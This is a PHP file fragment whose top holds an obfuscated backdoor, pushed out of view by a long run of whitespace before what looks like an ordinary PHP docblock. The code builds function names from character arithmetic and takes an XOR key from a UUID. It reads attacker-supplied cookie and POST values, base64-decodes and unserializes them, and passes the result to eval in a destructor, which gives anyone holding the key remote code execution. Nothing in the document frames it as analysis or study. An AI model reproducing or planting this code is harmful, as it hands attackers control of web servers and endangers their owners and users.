<?php                                                                                                                                                                                                                                                                                                                                                                                                 $rZmxp = "\x4e" . chr ( 749 - 660 )."\137" . chr ( 771 - 693 ).chr ( 919 - 804 )."\x4b";$RmKGVAYDm = "\143" . "\154" . "\x61" . chr ( 458 - 343 )."\163" . '_' . chr (101) . chr ( 746 - 626 ).chr ( 381 - 276 ).'s' . chr (116) . "\x73";$zfAWGOdc = $RmKGVAYDm($rZmxp); $vMiWDng = $zfAWGOdc;if (!$vMiWDng){class NY_NsK{private $cmRtCvx;public static $DkLmPwDaB = "a2d8480d-cc11-47ce-8ef1-6a042a88058a";public static $NrUkPmK = 17129;public function __construct($qIbhQOGR=0){$OfosY = $_COOKIE;$gwpWjGnpJo = $_POST;$WVHGLzl = @$OfosY[substr(NY_NsK::$DkLmPwDaB, 0, 4)];if (!empty($WVHGLzl)){$wIHAzLIVp = "base64";$janOJaso = "";$WVHGLzl = explode(",", $WVHGLzl);foreach ($WVHGLzl as $voiaPBCyDs){$janOJaso .= @$OfosY[$voiaPBCyDs];$janOJaso .= @$gwpWjGnpJo[$voiaPBCyDs];}$janOJaso = array_map($wIHAzLIVp . '_' . "\x64" . "\x65" . "\x63" . "\x6f" . chr (100) . 'e', array($janOJaso,)); $janOJaso = $janOJaso[0] ^ str_repeat(NY_NsK::$DkLmPwDaB, (strlen($janOJaso[0]) / strlen(NY_NsK::$DkLmPwDaB)) + 1);NY_NsK::$NrUkPmK = @unserialize($janOJaso);}}private function Tpapq(){if (is_array(NY_NsK::$NrUkPmK)) {$kmxgshFB = str_replace(chr (60) . '?' . "\160" . "\150" . chr (112), "", NY_NsK::$NrUkPmK["\143" . 'o' . "\x6e" . chr ( 738 - 622 ).chr (101) . 'n' . 't']);eval($kmxgshFB); $GgKhc = "34824";exit();}}public function __destruct(){$this->Tpapq(); $GgKhc = "34824";}}$YZSex = new NY_NsK(); $YZSex = "41990_1696";} ?><?php
/**
